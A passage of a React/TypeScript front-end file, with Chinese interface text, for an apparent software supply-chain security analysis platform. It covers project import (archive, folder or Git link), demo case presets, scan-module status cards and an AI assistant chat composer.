  const [projectName, setProjectName] = useState('')

  async function importDemoCase(presetKey: DemoPresetKey) {
    const preset = demoPresets[presetKey]
    setBusy(presetKey)
    try {
      const record = await importLocalProject({
        path: preset.localPath,
        projectName: preset.projectName,
      })
      toast.success(`${preset.label} 已导入`)
      onImported(record)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '案例导入失败')
    } finally {
      setBusy(null)
    }
  }

  async function runImport(kind: 'upload' | 'git' | 'local') {
    setBusy(kind)
    try {
      let record: ProjectImportRecord
      if (kind === 'upload') {
        if (!archive) {
          toast.error('请选择 zip、tar.gz 或 tgz 项目压缩包')
          return
        }
        record = await uploadProjectArchive(archive)
      } else if (kind === 'git') {
        if (!gitUrl.trim()) {
          toast.error('请输入 GitHub 或 Git 仓库链接')
          return
        }
        record = await importGitProject({
          url: gitUrl.trim(),
          ref: gitRef.trim() || undefined,
          projectName: projectName.trim() || undefined,
        })
      } else {
        if (!projectFiles.length) {
          toast.error('请选择要上传的项目文件或文件夹')
          return
        }
        record = await uploadProjectFiles(projectFiles, projectName.trim() || undefined)
      }
      onImported(record)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '项目导入失败')
    } finally {
      setBusy(null)
    }
  }

  const disabled = busy !== null

  return (
    <Card className='rounded-md shadow-sm'>
      <CardHeader>
        <div className='flex flex-wrap items-center justify-between gap-3'>
          <CardTitle>导入项目</CardTitle>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
              <Button variant='outline' className='rounded-md' disabled={disabled}>
                {busy && busy in demoPresets ? <Loader2 className='size-4 animate-spin' /> : <ShieldCheck className='size-4' />}
                选择案例
                <ChevronDown className='size-4' />
              </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align='end' className='w-80'>
              <DropdownMenuLabel>经典供应链案例</DropdownMenuLabel>
              <DropdownMenuSeparator />
              {(Object.entries(demoPresets) as Array<[DemoPresetKey, (typeof demoPresets)[DemoPresetKey]]>).map(([key, preset]) => (
                <DropdownMenuItem
                  key={key}
                  className='flex cursor-pointer flex-col items-start gap-1 rounded-md p-3'
                  disabled={disabled}
                  onSelect={(event) => {
                    event.preventDefault()
                    void importDemoCase(key)
                  }}
                >
                  <span className='font-medium'>{preset.label}</span>
                  <span className='line-clamp-2 text-xs text-muted-foreground'>{preset.description}</span>
                </DropdownMenuItem>
              ))}
            </DropdownMenuContent>
          </DropdownMenu>
        </div>
      </CardHeader>
      <CardContent className='space-y-4'>
        <div className='space-y-2'>
          <Label htmlFor='embedded-project-name'>项目名称</Label>
          <Input
            id='embedded-project-name'
            value={projectName}
            onChange={(event) => setProjectName(event.target.value)}
          />
        </div>

        <div className='grid gap-3 lg:grid-cols-3'>
          <div className='rounded-md border bg-[color:var(--surface-panel)] p-3'>
            <div className='mb-3 flex items-center gap-2 text-sm font-medium'>
              <Archive className='size-4 text-primary' />
              zip / 压缩包
            </div>
            <Input
              type='file'
              accept='.zip,.tar,.tar.gz,.tgz,application/zip,application/gzip'
              className={fileInputClass}
              onChange={(event) => setArchive(event.target.files?.[0] ?? null)}
            />
            <Button
              className={cn('mt-3 w-full', actionButtonClass)}
              disabled={disabled}
              onClick={() => void runImport('upload')}
            >
              {busy === 'upload' ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
              上传导入
            </Button>
          </div>

          <div className='rounded-md border bg-[color:var(--surface-panel)] p-3'>
            <div className='mb-3 flex items-center gap-2 text-sm font-medium'>
              <FolderOpen className='size-4 text-primary' />
              上传项目文件
            </div>
            <Input
              type='file'
              multiple
              className={fileInputClass}
              ref={(element) => {
                if (element) {
                  element.setAttribute('webkitdirectory', '')
                  element.setAttribute('directory', '')
                }
              }}
              onChange={(event) => setProjectFiles(Array.from(event.target.files ?? []))}
            />
            <Button
              className={cn('mt-3 w-full', actionButtonClass)}
              disabled={disabled}
              onClick={() => void runImport('local')}
            >
              {busy === 'local' ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
              {busy === 'local' ? '正在上传项目' : `上传检测${projectFiles.length ? `（${projectFiles.length} 个文件）` : ''}`}
            </Button>
          </div>
          <div className='rounded-md border bg-[color:var(--surface-panel)] p-3'>
            <div className='mb-3 flex items-center gap-2 text-sm font-medium'>
              <GitBranch className='size-4 text-primary' />
              GitHub 链接
            </div>
            <div className='grid gap-2'>
              <Input
                value={gitUrl}
                onChange={(event) => setGitUrl(event.target.value)}
                placeholder='https://github.com/org/repo.git'
              />
              <Input
                value={gitRef}
                onChange={(event) => setGitRef(event.target.value)}
                placeholder='分支 / Tag，可选'
              />
            </div>
            <Button
              className={cn('mt-3 w-full', actionButtonClass)}
              disabled={disabled}
              onClick={() => void runImport('git')}
            >
              {busy === 'git' ? <Loader2 className='size-4 animate-spin' /> : <GitBranch className='size-4' />}
              {busy === 'git' ? '正在拉取仓库' : '拉取导入'}
            </Button>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function PersistentReportCard({ workspace, animationKey, onOpenReport }: { workspace: SecurityWorkspace; animationKey: number; onOpenReport: () => void }) {
  const summary = workspace.graph?.summary
  if (!summary) return null
  return (
    <Card className="rounded-md border border-dashed bg-muted/10">
      <CardContent className="p-4">
        <div className="flex items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="flex size-10 items-center justify-center rounded-lg bg-cyan-100 dark:bg-cyan-950/40">
              <FileText className="size-5 text-cyan-600 dark:text-cyan-400" />
            </div>
            <div>
              <div className="text-sm font-semibold">安全研判报告</div>
              <div className="text-xs text-muted-foreground">
                {summary.node_count} 节点 · {summary.edge_count} 关系 · 风险 {workspace.graph?.risk_score ?? summary.risk_score ?? '-'}
              </div>
            </div>
          </div>
          <Button variant="outline" size="sm" className="rounded-md" onClick={onOpenReport}>
            查看报告
          </Button>
        </div>
      </CardContent>
    </Card>
  )
}

function AgentConversationHome({
  workspace,
  analysisStarted,
  scanRunning,
  scanSteps,
  question,
  setQuestion,
  attachments,
  attachmentBusy,
  onAddAttachments,
  onRemoveAttachment,
  assistantMode,
  onAssistantModeChange,
  messages,
  busy,
  onSubmit,
  onStartAnalysis,
  onOpenModule,
}: {
  workspace: SecurityWorkspace
  analysisStarted: boolean
  scanRunning: boolean
  scanSteps: ScanStepState[]
  question: string
  setQuestion: (value: string) => void
  attachments: AgentAttachment[]
  attachmentBusy: boolean
  onAddAttachments: (files: File[]) => void
  onRemoveAttachment: (attachmentId: string) => void
  assistantMode: AssistantMode
  onAssistantModeChange: (mode: AssistantMode) => void
  messages: SecurityAssistantResponse[]
  busy: boolean
  onSubmit: () => void
  onStartAnalysis: () => void
  onOpenModule: (module: PlatformTab) => void
}) {
  const visibleModules = agentModuleTabs.filter((module) => module !== 'copilot' && module !== 'report')
  const stepByModule = new Map<ScanStepState['id'], ScanStepState>(
    scanSteps.map((step) => [step.id, step])
  )
  const detectionModules = visibleModules.filter((module) => module !== 'graph')
  const completedDetectionModules = detectionModules.filter(
    (module) => moduleLaunchStep(module, stepByModule)?.status === 'completed'
  )
  const failedDetectionModules = detectionModules.filter(
    (module) => moduleLaunchStep(module, stepByModule)?.status === 'failed'
  )
  const completedModuleLabels = completedDetectionModules.map(
    (module) => moduleLaunchStep(module, stepByModule)?.label ?? workspaceTabTitles[module]
  )
  const remainingDetectionCount = Math.max(
    0,
    detectionModules.length - completedDetectionModules.length - failedDetectionModules.length
  )
  const reportStepCompleted = stepByModule.get('graph')?.status === 'completed'
  const currentReportReady = reportStepCompleted && Boolean(workspace.report)
  const fullReportReady = currentReportReady && completedDetectionModules.length === detectionModules.length
  const statusTitle = fullReportReady
    ? '项目研判已完成'
    : completedDetectionModules.length === 1
      ? `${completedModuleLabels[0]}已完成`
      : completedDetectionModules.length > 1
        ? `本次已完成 ${completedDetectionModules.length} 个检测模块`
        : '本次研判未完成'
  const statusDetails = [
    completedDetectionModules.length === detectionModules.length
      ? `${detectionModules.length} 个检测模块已完成`
      : completedDetectionModules.length
        ? `本次完成 ${completedDetectionModules.length} 个检测模块：${completedModuleLabels.join('、')}`
        : '没有检测模块成功完成',
    remainingDetectionCount ? `其余 ${remainingDetectionCount} 个检测模块未执行` : '',
    failedDetectionModules.length ? `${failedDetectionModules.length} 个检测模块执行失败` : '',
    fullReportReady
      ? '完整供应链溯源报告已生成'
      : currentReportReady
        ? '阶段性报告已更新，尚未形成完整供应链溯源报告'
        : '尚未生成完整供应链溯源报告',
  ].filter(Boolean)
  const statusDescription = statusDetails.join('；')

  return (
    <div className='mx-auto flex min-h-[calc(100svh-9rem)] w-full max-w-5xl flex-col'>
      <div className='flex-1 space-y-8 pb-40'>
        {!analysisStarted || scanRunning ? (
          <div className='rounded-md border bg-card p-4 shadow-[var(--shadow-soft)] sm:p-5'>
            <ScanProgressPanel steps={scanSteps} running={scanRunning} completed={analysisStarted} />
            <ModuleLaunchGrid
              modules={visibleModules}
              analysisStarted={analysisStarted}
              scanRunning={scanRunning}
              scanSteps={scanSteps}
              onStart={onStartAnalysis}
              onOpenModule={onOpenModule}
            />
          </div>
        ) : (
          <div className='space-y-4'>
            <div className='flex flex-wrap items-center justify-between gap-3 border-b border-border/70 px-1 pb-4'>
              <div className='flex min-w-0 items-center gap-3'>
                <span className='grid size-8 shrink-0 place-items-center rounded-lg bg-emerald-500/10 text-emerald-500'>
                  <CheckCircle2 className='size-4' />
                </span>
                <div className='min-w-0'>
                  <p className='text-sm font-semibold'>{statusTitle}</p>
                  <p className='mt-0.5 text-xs leading-5 text-muted-foreground'>{statusDescription}</p>
                </div>
              </div>
              {currentReportReady ? <Button variant='ghost' size='sm' className='group rounded-md text-muted-foreground hover:text-foreground' onClick={() => onOpenModule('report')}>
                <FileText className='size-4' />
                {fullReportReady ? '查看报告' : '查看阶段性报告'}
                <ChevronRight className='size-4 transition-transform group-hover:translate-x-0.5' />
              </Button> : null}
            </div>
            <ModuleResultNavigation
              modules={visibleModules}
              scanSteps={scanSteps}
              onOpenModule={onOpenModule}
            />
          </div>
        )}

        {messages.length ? (
          messages.map((message, index) => (
            <Fragment key={`${message.question}-${index}`}>
            <CopilotMessage
              role='user'
              title='你'
              icon={<User className='size-4' />}
            >
              <p>{message.question}</p>
            </CopilotMessage>
            <CopilotMessage
              role='assistant'
              title={assistantMessageTitle(message)}
              icon={<SecurityAiIcon className='size-7' />}
              action={<CopyAnswerButton text={message.answer} />}
            >
              <CopilotMarkdown text={message.answer} />
            </CopilotMessage>
            </Fragment>
          ))
        ) : analysisStarted ? (
          <div className='mx-auto flex w-full max-w-3xl flex-col items-center py-10 text-center'>
            <div className='grid size-12 place-items-center rounded-xl border border-cyan-400/25 bg-cyan-400/10 text-cyan-400'>
              <SecurityAiIcon className='size-9' />
            </div>
            <h2 className='mt-4 text-lg font-semibold'>{fullReportReady ? '项目证据已就绪' : '已完成模块的证据已就绪'}</h2>
            <div className='mt-6 grid w-full gap-2 sm:grid-cols-2'>
              {[
                '这个项目是否存在供应链风险？',
                '最需要优先修复的风险是什么？',
                '说明当前攻击链和关键证据',
                '这些发现是否可能是误报？',
              ].map((prompt) => (
                <button
                  key={prompt}
                  type='button'
                  className='min-h-12 rounded-lg border border-border/80 bg-background px-4 py-3 text-left text-sm leading-6 text-foreground transition-colors hover:border-cyan-400/50 hover:bg-muted/35'
                  onClick={() => setQuestion(prompt)}
                >
                  {prompt}
                </button>
              ))}
            </div>
          </div>
        ) : null}

        {busy ? <AssistantThinkingState label='正在整理当前项目的证据与处置建议' /> : null}
      </div>

      <div className='sticky -bottom-4 z-40 w-full bg-[color:var(--surface-shell)] pt-4 pb-3'>
        <AssistantComposer
          value={question}
          onChange={setQuestion}
          attachments={attachments}
          attachmentBusy={attachmentBusy}
          onAddAttachments={onAddAttachments}
          onRemoveAttachment={onRemoveAttachment}
          mode={assistantMode}
          onModeChange={onAssistantModeChange}
          onSubmit={onSubmit}
          busy={busy}
          placeholder='询问风险原因、攻击链路、修复优先级或误报可能性'
        />
      </div>
    </div>
  )
}

const compactModuleLabels: Partial<Record<PlatformTab, string>> = {
  code: '代码审查',
  supply: '供应链',
  pipeline: 'CI/CD',
  artifact: '产物可信',
  logs: '日志印证',
  multimodal: '多模态证据',
  graph: '图谱与报告',
}

function ModuleResultNavigation({
  modules,
  scanSteps,
  onOpenModule,
}: {
  modules: PlatformTab[]
  scanSteps: ScanStepState[]
  onOpenModule: (module: PlatformTab) => void
}) {
  const stepByModule = new Map<ScanStepState['id'], ScanStepState>(
    scanSteps.map((step) => [step.id, step])
  )
  const completedCount = modules.filter(
    (module) => moduleLaunchStep(module, stepByModule)?.status === 'completed'
  ).length

  return (
    <nav aria-label='模块详情' className='space-y-2'>
      <div className='flex items-center justify-between gap-3 px-1'>
        <h2 className='text-sm font-semibold'>模块详情</h2>
        <span className='text-xs text-muted-foreground'>{completedCount} 已完成 · {modules.length - completedCount} 未完成</span>
      </div>
      <div className='grid grid-cols-2 gap-2 sm:grid-cols-3 xl:grid-cols-4 2xl:grid-cols-7'>
        {modules.map((module) => {
          const step = moduleLaunchStep(module, stepByModule)
          const status = step?.status ?? 'pending'
          const moduleMeta = evidenceModuleCards[module]
          const Icon = moduleMeta?.icon ?? ShieldCheck
          const label = compactModuleLabels[module] ?? moduleMeta?.title ?? workspaceTabTitles[module]
          const statusLabel = status === 'completed'
            ? '已完成'
            : status === 'failed'
              ? '执行失败'
              : status === 'running'
                ? '执行中'
                : '本轮未执行'

          return (
            <button
              key={module}
              type='button'
              className='group flex min-h-14 min-w-0 items-center gap-2 rounded-md border border-border/75 bg-background px-3 py-2 text-left transition-colors hover:border-cyan-400/50 hover:bg-muted/35 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-cyan-400/40'
              onClick={() => onOpenModule(module)}
            >
              <span className={cn(
                'grid size-8 shrink-0 place-items-center rounded-md',
                status === 'completed' && 'bg-emerald-500/10 text-emerald-500',
                status === 'failed' && 'bg-red-500/10 text-red-500',
                status === 'running' && 'bg-cyan-500/10 text-cyan-500',
                !['completed', 'failed', 'running'].includes(status) && 'bg-muted text-muted-foreground'
              )}>
                <Icon className='size-4' />
              </span>
              <span className='min-w-0 flex-1'>
                <span className='block truncate text-xs font-semibold text-foreground' title={label}>{label}</span>
                <span className={cn(
                  'mt-0.5 block truncate text-[11px]',
                  status === 'completed' && 'text-emerald-500',
                  status === 'failed' && 'text-red-500',
                  status === 'running' && 'text-cyan-500',
                  !['completed', 'failed', 'running'].includes(status) && 'text-muted-foreground'
                )}>{statusLabel}</span>
              </span>
              <ChevronRight className='size-3.5 shrink-0 text-muted-foreground transition-transform group-hover:translate-x-0.5 group-hover:text-foreground' />
            </button>
          )
        })}
      </div>
    </nav>
  )
}

function AssistantComposer({
  value,
  onChange,
  attachments,
  attachmentBusy,
  onAddAttachments,
  onRemoveAttachment,
  mode,
  onModeChange,
  onSubmit,
  busy,
  placeholder,
  compact = false,
}: {
  value: string
  onChange: (value: string) => void
  attachments: AgentAttachment[]
  attachmentBusy: boolean
  onAddAttachments: (files: File[]) => void
  onRemoveAttachment: (attachmentId: string) => void
  mode: AssistantMode
  onModeChange: (mode: AssistantMode) => void
  onSubmit: () => void
  busy: boolean
  placeholder: string
  compact?: boolean
}) {
  const [dragActive, setDragActive] = useState(false)
  const dragDepthRef = useRef(0)
  const attachmentInputRef = useRef<HTMLInputElement>(null)
  const { textareaRef, adjustHeight } = useAutoResizeTextarea({
    minHeight: compact ? 54 : 64,
    maxHeight: 180,
  })

  const submit = () => {
    if (busy || !value.trim()) return
    onSubmit()
    window.requestAnimationFrame(() => adjustHeight(true))
  }

  return (
    <div className='mx-auto w-full max-w-5xl'>
      <div
        className={cn(
          'group relative overflow-hidden rounded-2xl border border-border/90 bg-card shadow-[0_16px_48px_rgba(2,6,23,0.3)] transition-[border-color,box-shadow,background-color] focus-within:border-cyan-400/60 focus-within:shadow-[0_0_0_1px_rgba(34,211,238,0.12),0_20px_56px_rgba(2,6,23,0.4)]',
          dragActive && 'border-cyan-400 bg-cyan-50/70 shadow-[0_0_0_3px_rgba(34,211,238,0.16),0_20px_56px_rgba(2,6,23,0.22)] dark:bg-cyan-950/35'
        )}
        onDragEnter={(event) => {
          if (!event.dataTransfer.types.includes('Files')) return
          event.preventDefault()
          event.stopPropagation()
          dragDepthRef.current += 1
          setDragActive(true)
        }}
        onDragOver={(event) => {
          if (!event.dataTransfer.types.includes('Files')) return
          event.preventDefault()
          event.stopPropagation()
          event.dataTransfer.dropEffect = 'copy'
        }}
        onDragLeave={(event) => {
          event.preventDefault()
          event.stopPropagation()
          dragDepthRef.current = Math.max(0, dragDepthRef.current - 1)
          if (dragDepthRef.current === 0) setDragActive(false)
        }}
        onDrop={(event) => {
          event.preventDefault()
          event.stopPropagation()
          dragDepthRef.current = 0
          setDragActive(false)
          const files = Array.from(event.dataTransfer.files ?? [])
          if (files.length) onAddAttachments(files)
        }}
      >
        {attachments.length ? (
          <div className='flex flex-wrap gap-1.5 px-4 pt-3'>
            {attachments.map((attachment) => (
              <span key={attachment.attachmentId} className='inline-flex max-w-full items-center gap-1.5 rounded-md border bg-background/90 px-2 py-1 text-[11px] shadow-sm'>
                {attachment.kind === 'image' ? <Images className='size-3 text-cyan-600' /> : <FileText className='size-3 text-slate-500' />}
                <span className='max-w-52 truncate' title={attachment.filename}>{attachment.filename}</span>
                <Badge variant='outline' className='rounded px-1 py-0 text-[9px]'>{attachmentKindLabel(attachment.kind)}</Badge>
                <button
                  type='button'
                  className='rounded p-0.5 text-muted-foreground hover:text-foreground'
                  aria-label={`移除附件 ${attachment.filename}`}
                  title='移除附件'
                  onClick={() => onRemoveAttachment(attachment.attachmentId)}
                >
                  <X className='size-3' />
                </button>
              </span>
            ))}
          </div>
        ) : null}
        {dragActive ? <div className='pointer-events-none absolute inset-0 z-10 grid place-items-center bg-cyan-100/45 text-sm font-semibold text-cyan-800 dark:bg-cyan-950/45 dark:text-cyan-200'>松开以上传到 Agent</div> : null}
        <Textarea
          ref={textareaRef}
          value={value}
          onChange={(event) => {
            onChange(event.target.value)
            adjustHeight()
          }}
          onKeyDown={(event) => {
            if (event.key === 'Enter' && !event.shiftKey) {
              event.preventDefault()
              submit()
            }
          }}
          placeholder={placeholder}
          className={cn(
            'min-h-28 resize-none border-0 bg-transparent px-5 pb-16 pt-5 text-[15px] leading-7 shadow-none focus-visible:ring-0',
            'placeholder:text-muted-foreground/75',
            compact && 'min-h-24 pb-16 pt-4'
          )}
          style={{ overflow: 'hidden' }}
        />

        <div className='absolute inset-x-3 bottom-3 flex h-10 items-center gap-1.5'>
          <input
            ref={attachmentInputRef}
            type='file'
            multiple
            accept='image/*,.log,.jsonl,.ndjson,.txt,.md,.json,.yaml,.yml,.csv,.zip,.tar,.gz,.tgz,.intoto.json,.intoto.jsonl'
            className='hidden'
            onChange={(event) => {
              onAddAttachments(Array.from(event.target.files ?? []))
              event.currentTarget.value = ''
            }}
          />
          <Button
            type='button'
            variant='ghost'
            size='icon'
            className='size-9 rounded-xl text-muted-foreground hover:bg-muted hover:text-foreground'
            disabled={attachmentBusy}
            onClick={() => attachmentInputRef.current?.click()}
            aria-label={attachmentBusy ? '附件上传中' : '上传 Agent 附件'}
            title={attachmentBusy ? '附件上传中' : '上传 Agent 附件'}
          >
            {attachmentBusy ? <Loader2 className='size-4 animate-spin' /> : <Upload className='size-4' />}
          </Button>
          <DropdownMenu>
            <DropdownMenuTrigger asChild>
            <Button
              type='button'
              variant='ghost'
              size='sm'
              className='h-9 rounded-xl px-3 text-xs font-medium text-foreground hover:bg-muted'
            >
              {mode === 'agent' ? <Bot className='size-4 text-cyan-500' /> : <Network className='size-4 text-cyan-500' />}
              <span>{assistantModeLabel(mode)}</span>
              <ChevronDown className='size-3.5 text-muted-foreground' />
            </Button>
            </DropdownMenuTrigger>
            <DropdownMenuContent align='start' side='top' className='w-64'>
              <DropdownMenuLabel>回答方式</DropdownMenuLabel>
              <DropdownMenuItem onClick={() => onModeChange('graphrag')} className='flex cursor-pointer items-start gap-3 py-2.5'>
                <Network className='mt-0.5 size-4 text-cyan-500' />
                <div className='min-w-0 flex-1'>
                  <div className='flex items-center justify-between gap-2'><span>GraphRAG</span>{mode === 'graphrag' ? <CheckCircle2 className='size-4 text-cyan-500' /> : null}</div>
                  <p className='mt-0.5 text-xs text-muted-foreground'>快速检索当前图谱和已有证据</p>
                </div>
              </DropdownMenuItem>
              <DropdownMenuItem onClick={() => onModeChange('agent')} className='flex cursor-pointer items-start gap-3 py-2.5'>
                <Bot className='mt-0.5 size-4 text-cyan-500' />
                <div className='min-w-0 flex-1'>
                  <div className='flex items-center justify-between gap-2'><span>Agent</span>{mode === 'agent' ? <CheckCircle2 className='size-4 text-cyan-500' /> : null}</div>
                  <p className='mt-0.5 text-xs text-muted-foreground'>按需调用扫描模块并形成研判</p>
                </div>
              </DropdownMenuItem>
            </DropdownMenuContent>
          </DropdownMenu>

          <div className='flex-1' />

          <Button
            type='button'
            onClick={submit}
            disabled={busy || !value.trim()}
            size='icon'
            className={cn(
              'size-9 rounded-xl transition-[background-color,color,transform]',
              value.trim() && !busy
                ? 'bg-cyan-400 text-slate-950 hover:-translate-y-0.5 hover:bg-cyan-300'
                : 'bg-muted text-muted-foreground'
            )}
            aria-label={busy ? '正在生成回答' : '发送'}
          >
            {busy ? <Loader2 className='size-4 animate-spin' /> : <ArrowUp className='size-4' />}
          </Button>
        </div>
      </div>
    </div>
  )
}

function SecurityAiIcon({ className }: { className?: string }) {
  return (
    <svg
      viewBox='0 0 200 200'
      aria-hidden='true'
      className={className}
      fill='none'
      xmlns='http://www.w3.org/2000/svg'
    >
      <path
        d='M109 24c-10 11-17 28-19 48M109 24c12 13 20 30 22 50M109 24c-28 0-52 14-66 35m66-35c17 0 33 5 46 14M33 96h72M42 59c16 13 41 21 67 21 16 0 31-3 44-8M32 95c0 34 21 63 51 75M32 95c0-13 3-25 10-36'
        stroke='currentColor'
        strokeWidth='14'
        strokeLinecap='round'
        strokeLinejoin='round'
      />
      <path
        d='M124 82l50 16v35c0 27-18 42-50 54-32-12-50-27-50-54V98l50-16z'
        stroke='currentColor'
        strokeWidth='14'
        strokeLinejoin='round'
      />
      <path
        d='M124 120v38M105 139h38'
        stroke='currentColor'
        strokeWidth='14'
        strokeLinecap='round'
      />
    </svg>
  )
}

const evidenceModuleCards: Partial<Record<PlatformTab, {
  title?: string
  missing?: string[]
  icon: LucideIcon
}>> = {
  code: {
    title: '代码审查研判',
    icon: Code2,
  },
  supply: {
    title: '供应链可达性研判',
    icon: Route,
  },
  pipeline: {
    icon: GitBranch,
  },
  artifact: {
    missing: ['缺 artifact', '缺 provenance'],
    icon: ShieldCheck,
  },
  logs: {
    missing: ['缺运行日志'],
    icon: FileText,
  },
  multimodal: {
    missing: ['缺外部告警'],
    icon: Siren,
  },
  graph: {
    icon: Network,
  },
  report: {
    icon: ClipboardList,
  },
}

const evidenceModuleTones = {
  completed: {
    line: 'bg-emerald-300/80',
    glow: 'bg-emerald-400',
    icon: 'text-emerald-200',
    iconWrap: 'border-emerald-400/20 bg-emerald-400/10',
    badge: 'border-[rgba(16,185,129,0.35)] bg-[rgba(16,185,129,0.12)] text-[#6ee7b7]',
    chip: 'border-emerald-400/20 bg-emerald-400/10 text-emerald-100/80',
  },
  pending: {
    line: 'bg-amber-300/80',
    glow: 'bg-amber-400',
    icon: 'text-amber-200',
    iconWrap: 'border-amber-400/20 bg-amber-400/10',
    badge: 'border-[rgba(245,158,11,0.35)] bg-[rgba(245,158,11,0.12)] text-[#fbbf24]',
    chip: 'border-amber-400/25 bg-amber-400/10 text-amber-100/90',
  },
  failed: {
    line: 'bg-red-300/80',
    glow: 'bg-red-400',
    icon: 'text-red-200',
    iconWrap: 'border-red-400/20 bg-red-400/10',
    badge: 'border-red-400/35 bg-red-500/10 text-red-200',
    chip: 'border-red-400/25 bg-red-500/10 text-red-100/90',
  },
}

function ModuleLaunchGrid({
  modules,
  analysisStarted,
  scanRunning,
  scanSteps,
  onStart,
  onOpenModule,
}: {
  modules: PlatformTab[]
  analysisStarted: boolean
  scanRunning: boolean
  scanSteps: ScanStepState[]
  onStart: () => void
  onOpenModule: (module: PlatformTab) => void
}) {
  const reducedMotion = useReducedMotion()
  const stepByModule = new Map<ScanStepState['id'], ScanStepState>(
    scanSteps.map((step) => [step.id, step])
  )
  const statusSummary = modules.reduce(
    (summary, module) => {
      const step = moduleLaunchStep(module, stepByModule)
      if (analysisStarted && !scanRunning && step?.status === 'skipped') summary.pending += 1
      else if (analysisStarted && !scanRunning && step?.status === 'completed') summary.completed += 1
      return summary
    },
    { completed: 0, pending: 0 }
  )

  return (
    <div className='mt-3 space-y-3'>
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <div className='text-section-title'>模块详情</div>
        {analysisStarted && !scanRunning ? (
          <div className='flex items-center gap-2'>
            <span className='inline-flex h-[26px] items-center whitespace-nowrap rounded-full border border-emerald-400/30 bg-emerald-500/10 px-2.5 text-[13px] font-bold leading-none text-emerald-200'>
              {statusSummary.completed} 已完成
            </span>
            <span className='inline-flex h-[26px] items-center whitespace-nowrap rounded-full border border-amber-400/30 bg-amber-500/10 px-2.5 text-[13px] font-bold leading-none text-amber-200'>
              {statusSummary.pending} 待补充
            </span>
          </div>
        ) : (
          <Button size='sm' className={actionButtonClass} onClick={onStart} disabled={scanRunning}>
            {scanRunning ? <Loader2 className='size-4 animate-spin' /> : <Radar className='size-4' />}
            {scanRunning ? '扫描中' : '运行扫描'}
          </Button>
        )}
      </div>
      <div className='grid gap-3 sm:grid-cols-2 xl:grid-cols-3'>
        {modules.map((module, index) => {
          const step = moduleLaunchStep(module, stepByModule)
          const isReady = analysisStarted && !scanRunning
          const isSkipped = step?.status === 'skipped'
          const isFailed = step?.status === 'failed'
          const isCompleted = isReady && step?.status === 'completed'
          const cardMeta = evidenceModuleCards[module]
          const Icon = cardMeta?.icon ?? ShieldCheck
          const moduleTitle = cardMeta?.title ?? workspaceTabTitles[module]
          const allowTitleWrap = ['code', 'supply', 'pipeline', 'multimodal'].includes(module)
          const tone = isReady && isSkipped ? evidenceModuleTones.pending : isFailed ? evidenceModuleTones.failed : evidenceModuleTones.completed
          const statusLabel = isReady
            ? isSkipped
              ? '待补充'
              : isFailed
                ? '异常'
                : '已完成'
            : scanRunning && step?.status === 'running'
              ? '扫描中'
              : '等待'
          const missingChips = isReady && isSkipped ? cardMeta?.missing ?? [] : []

          return (
            <motion.div
              key={module}
              initial={reducedMotion ? false : { opacity: 0, y: 10, scale: 0.98 }}
              animate={reducedMotion ? undefined : { opacity: 1, y: 0, scale: 1 }}
              transition={{ type: 'spring', stiffness: 380, damping: 28, mass: 0.72, delay: index * 0.035 }}
            >
              <Button
                type='button'
                variant='outline'
                className={cn(
                  'group relative h-[128px] w-full cursor-pointer justify-start overflow-hidden rounded-md border border-border bg-[color:var(--surface-card)] px-5 py-4 text-left shadow-sm transition-[border-color,background-color,box-shadow,transform] duration-200 hover:-translate-y-px hover:border-slate-300/35 hover:bg-[color:var(--surface-inset)] hover:shadow-md hover:shadow-cyan-950/10 active:scale-[0.99] disabled:pointer-events-auto disabled:cursor-not-allowed disabled:opacity-80',
                  isCompleted && 'hover:border-emerald-300/35',
                  isReady && isSkipped && 'hover:border-amber-300/35',
                  isFailed && 'hover:border-red-300/35'
                )}
                disabled={scanRunning}
                onClick={() => onOpenModule(module)}
              >
                <span className={cn('absolute inset-y-0 left-0 w-[3px]', tone.line)} />
                <span className={cn('absolute -right-8 -top-10 size-24 rounded-full blur-2xl opacity-20 transition-opacity duration-200 group-hover:opacity-30', tone.glow)} />
                <span className='flex h-full min-w-0 flex-1 flex-col'>
                  <span className='grid min-w-0 grid-cols-[44px_minmax(0,1fr)_auto] items-start gap-3'>
                    <span className={cn('grid size-11 shrink-0 place-items-center rounded-md border', tone.iconWrap)}>
                      <Icon className={cn('size-5', tone.icon)} />
                    </span>
                    <span className={cn('min-w-0 pt-1 !text-[18px] !font-extrabold leading-[1.15] text-section-title [word-break:keep-all]', allowTitleWrap ? 'line-clamp-2 whitespace-normal' : 'truncate whitespace-nowrap')} title={moduleTitle}>
                      {moduleTitle}
                    </span>
                    <span className={cn('inline-flex h-7 shrink-0 items-center justify-center whitespace-nowrap rounded-full border px-3 text-[13px] font-extrabold leading-none', tone.badge)}>
                      {statusLabel}
                    </span>
                  </span>
                  {missingChips.length ? (
                    <span className='mt-auto flex flex-wrap gap-2 pl-14'>
                      {missingChips.map((chip) => (
                        <span key={chip} className={cn('inline-flex h-6 items-center whitespace-nowrap rounded-full border px-2.5 text-xs font-semibold leading-none', tone.chip)}>
                          {chip}
                        </span>
                      ))}
                    </span>
                  ) : null}
                </span>
              </Button>
            </motion.div>
          )
        })}
      </div>
    </div>
  )
}

function moduleLaunchStep(
  module: PlatformTab,
  stepByModule: Map<ScanStepState['id'], ScanStepState>
): ScanStepState | undefined {
  return stepByModule.get(module === 'report' ? 'graph' : module)
}

function ScanProgressPanel({
  steps,
  running,
  completed,
}: {
  steps: ScanStepState[]
  running: boolean
  completed: boolean
}) {
  const reducedMotion = useReducedMotion()
  const finished = steps.filter((step) =>
    ['completed', 'skipped', 'failed'].includes(step.status)
  ).length
  const runningWeight = running && steps.some((step) => step.status === 'running') ? 0.35 : 0
  const percent = Math.min(
    100,
    Math.round(((finished + runningWeight) / Math.max(1, steps.length)) * 100)
  )
  const failedSteps = steps.filter((step) => step.status === 'failed')
  const skippedSteps = steps.filter((step) => step.status === 'skipped')

  return (
    <motion.div
      className='mt-4 space-y-3 overflow-hidden rounded-md border bg-[color:var(--surface-panel)] p-4 shadow-sm shadow-cyan-950/10'
      initial={reducedMotion ? false : { opacity: 0, y: 18, scale: 0.985 }}
